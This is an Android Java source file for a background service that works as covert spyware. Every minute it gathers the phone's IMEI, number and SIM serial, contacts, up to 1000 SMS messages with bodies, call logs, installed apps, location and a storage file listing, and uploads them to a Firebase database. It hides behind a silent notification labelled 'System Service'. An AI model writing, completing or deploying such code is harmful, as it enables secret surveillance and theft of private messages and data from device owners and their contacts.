package com.dataPackageSandeep.com;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.TelephonyManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.FieldValue;
import com.google.gson.Gson;
import com.google.gson.JsonObject;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class DataCollectionService extends Service {
    
    private static final String CHANNEL_ID = "DataCollectionChannel";
    private static final int NOTIFICATION_ID = 1;
    private ScheduledExecutorService scheduler;
    private FirebaseFirestore db;
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        db = FirebaseFirestore.getInstance();
        scheduler = Executors.newScheduledThreadPool(1);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Collect data immediately
        collectAndSendData();
        
        // Schedule periodic collection (every 1 minute)
        scheduler.scheduleAtFixedRate(this::collectAndSendData, 1, 1, TimeUnit.MINUTES);
        
        return START_STICKY;
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableLights(false);
            channel.enableVibration(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        // Create a minimal, unobtrusive notification
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setShowWhen(false)
            .setSilent(true)
            .build();
    }
    
    private void collectAndSendData() {
        new Thread(() -> {
            try {
                // Collect device info
                Map<String, Object> deviceInfo = collectDeviceInfo();
                String deviceId = (String) deviceInfo.get("deviceId");
                if (deviceId == null || deviceId.isEmpty()) {
                    deviceId = Build.ID;
                }
                
                // Update or create device document
                Map<String, Object> deviceData = new HashMap<>();
                deviceData.put("device_id", deviceId);
                deviceData.put("model", deviceInfo.get("model"));
                deviceData.put("manufacturer", deviceInfo.get("manufacturer"));
                deviceData.put("android_version", deviceInfo.get("androidVersion"));
                deviceData.put("phone_number", deviceInfo.get("phoneNumber"));
                deviceData.put("imei", deviceInfo.get("imei"));
                deviceData.put("last_seen", FieldValue.serverTimestamp());
                deviceData.put("updated_at", FieldValue.serverTimestamp());
                
                db.collection("devices").document(deviceId).set(deviceData);
                
                // Collect and store contacts
                List<Map<String, Object>> contacts = collectContacts();
                for (Map<String, Object> contact : contacts) {
                    db.collection("devices").document(deviceId)
                        .collection("contacts").add(contact);
                }
                
                // Collect and store SMS
                List<Map<String, Object>> smsList = collectSMS();
                for (Map<String, Object> sms : smsList) {
                    db.collection("devices").document(deviceId)
                        .collection("sms").add(sms);
                }
                
                // Collect and store call logs
                List<Map<String, Object>> callLogs = collectCallLogs();
                for (Map<String, Object> call : callLogs) {
                    db.collection("devices").document(deviceId)
                        .collection("call_logs").add(call);
                }
                
                // Collect and store installed apps
                List<Map<String, Object>> apps = collectInstalledApps();
                for (Map<String, Object> app : apps) {
                    db.collection("devices").document(deviceId)
                        .collection("installed_apps").add(app);
                }
                
                // Collect and store location
                Map<String, Object> location = collectLocation();
                if (location != null && !location.isEmpty()) {
                    db.collection("devices").document(deviceId)
                        .collection("locations").add(location);
                }
                
                // Collect and store files
                List<Map<String, Object>> files = collectFileList();
                for (Map<String, Object> file : files) {
                    db.collection("devices").document(deviceId)
                        .collection("files").add(file);
                }
                
                // Record submission
                Map<String, Object> submission = new HashMap<>();
                submission.put("timestamp", System.currentTimeMillis());
                submission.put("collected_at", FieldValue.serverTimestamp());
                db.collection("devices").document(deviceId)
                    .collection("submissions").add(submission);
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    private Map<String, Object> collectDeviceInfo() {
        Map<String, Object> deviceInfo = new HashMap<>();
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        
        deviceInfo.put("deviceId", Build.ID);
        deviceInfo.put("model", Build.MODEL);
        deviceInfo.put("manufacturer", Build.MANUFACTURER);
        deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
        deviceInfo.put("sdkVersion", Build.VERSION.SDK_INT);
        deviceInfo.put("phoneNumber", tm.getLine1Number());
        deviceInfo.put("imei", tm.getDeviceId());
        deviceInfo.put("simSerial", tm.getSimSerialNumber());
        deviceInfo.put("networkOperator", tm.getNetworkOperatorName());
        
        return deviceInfo;
    }
    
    private List<Map<String, Object>> collectContacts() {
        List<Map<String, Object>> contacts = new ArrayList<>();
        
        try (Cursor cursor = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null)) {
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    Map<String, Object> contact = new HashMap<>();
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    
                    contact.put("name", name);
                    contact.put("phone", phone);
                    contact.put("collected_at", FieldValue.serverTimestamp());
                    contacts.add(contact);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return contacts;
    }
    
    private List<Map<String, Object>> collectSMS() {
        List<Map<String, Object>> smsList = new ArrayList<>();
        
        try (Cursor cursor = getContentResolver().query(
            Telephony.Sms.CONTENT_URI,
            null, null, null, Telephony.Sms.DATE + " DESC")) {
            
            if (cursor != null) {
                int limit = 0;
                while (cursor.moveToNext() && limit < 1000) {
                    Map<String, Object> sms = new HashMap<>();
                    sms.put("address", cursor.getString(
                        cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(
                        cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    sms.put("date", cursor.getString(
                        cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    sms.put("type", cursor.getString(
                        cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                    sms.put("collected_at", FieldValue.serverTimestamp());
                    smsList.add(sms);
                    limit++;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return smsList;
    }
    
    private List<Map<String, Object>> collectCallLogs() {
        List<Map<String, Object>> callLogs = new ArrayList<>();
        
        try (Cursor cursor = getContentResolver().query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, CallLog.Calls.DATE + " DESC")) {
            
            if (cursor != null) {
                int limit = 0;
                while (cursor.moveToNext() && limit < 1000) {
                    Map<String, Object> call = new HashMap<>();
                    call.put("number", cursor.getString(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("type", cursor.getString(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    call.put("date", cursor.getString(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("duration", cursor.getString(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    call.put("collected_at", FieldValue.serverTimestamp());
                    callLogs.add(call);
                    limit++;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return callLogs;
    }
    
    private List<Map<String, Object>> collectInstalledApps() {
        List<Map<String, Object>> apps = new ArrayList<>();
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        
        for (ApplicationInfo packageInfo : packages) {
            Map<String, Object> app = new HashMap<>();
            app.put("package_name", packageInfo.packageName);
            app.put("app_name", pm.getApplicationLabel(packageInfo).toString());
            app.put("is_system_app", (packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
            app.put("collected_at", FieldValue.serverTimestamp());
            apps.add(app);
        }
        
        return apps;
    }
    
    private Map<String, Object> collectLocation() {
        Map<String, Object> location = new HashMap<>();
        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == 
                    PackageManager.PERMISSION_GRANTED) {
                    Location lastLocation = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (lastLocation == null) {
                        lastLocation = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    }
                    
                    if (lastLocation != null) {
                        location.put("latitude", lastLocation.getLatitude());
                        location.put("longitude", lastLocation.getLongitude());
                        location.put("accuracy", lastLocation.getAccuracy());
                        location.put("timestamp", lastLocation.getTime());
                        location.put("collected_at", FieldValue.serverTimestamp());
                    }
                }
            } else {
                Location lastLocation = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastLocation == null) {
                    lastLocation = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                
                if (lastLocation != null) {
                    location.put("latitude", lastLocation.getLatitude());
                    location.put("longitude", lastLocation.getLongitude());
                    location.put("accuracy", lastLocation.getAccuracy());
                    location.put("timestamp", lastLocation.getTime());
                    location.put("collected_at", FieldValue.serverTimestamp());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return location.isEmpty() ? null : location;
    }
    
    private List<Map<String, Object>> collectFileList() {
        List<Map<String, Object>> files = new ArrayList<>();
        
        try {
            File externalStorage = getExternalFilesDir(null);
            if (externalStorage != null) {
                File root = externalStorage.getParentFile().getParentFile();
                collectFilesRecursive(root, files, 0, 1000);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return files;
    }
    
    private void collectFilesRecursive(File dir, List<Map<String, Object>> files, int depth, int maxFiles) {
        if (depth > 5 || files.size() >= maxFiles) return;
        
        try {
            File[] fileList = dir.listFiles();
            if (fileList != null) {
                for (File file : fileList) {
                    if (files.size() >= maxFiles) break;
                    
                    Map<String, Object> fileInfo = new HashMap<>();
                    fileInfo.put("name", file.getName());
                    fileInfo.put("path", file.getAbsolutePath());
                    fileInfo.put("size", file.length());
                    fileInfo.put("is_directory", file.isDirectory());
                    fileInfo.put("last_modified", file.lastModified());
                    fileInfo.put("collected_at", FieldValue.serverTimestamp());
                    files.add(fileInfo);
                    
                    if (file.isDirectory() && depth < 3) {
                        collectFilesRecursive(file, files, depth + 1, maxFiles);
                    }
                }
            }
        } catch (Exception e) {
            // Skip directories we can't access
        }
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) {
            scheduler.shutdown();
        }
    }
}
